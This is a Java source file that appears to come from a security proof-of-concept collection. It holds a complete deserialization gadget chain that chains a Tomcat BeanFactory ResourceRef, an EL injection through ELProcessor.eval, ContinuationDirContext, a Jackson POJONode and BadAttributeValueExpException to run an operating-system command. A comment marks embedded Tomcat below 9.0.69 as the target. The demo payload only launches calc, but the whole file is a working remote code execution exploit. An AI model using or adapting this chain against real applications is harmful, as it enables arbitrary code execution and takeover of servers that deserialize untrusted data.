package com.javasec.pocs.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import org.apache.naming.ResourceRef;

import javax.management.BadAttributeValueExpException;
import javax.naming.CannotProceedException;
import javax.naming.StringRefAddr;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

public class BAElChain {
    public static void main(String[] args) throws Exception {
        //embed 9.0.69以下,EL
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "pupi1=eval"));
        resourceRef.add(new StringRefAddr("pupi1", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\""+ "java.lang.Runtime.getRuntime().exec('calc');" +"\")"));
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(resourceRef);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        POJONode jsonNodes = new POJONode(ctx);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        SerializeUtils.setFieldValue(badAttributeValueExpException,"val",jsonNodes);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException));
    }
}
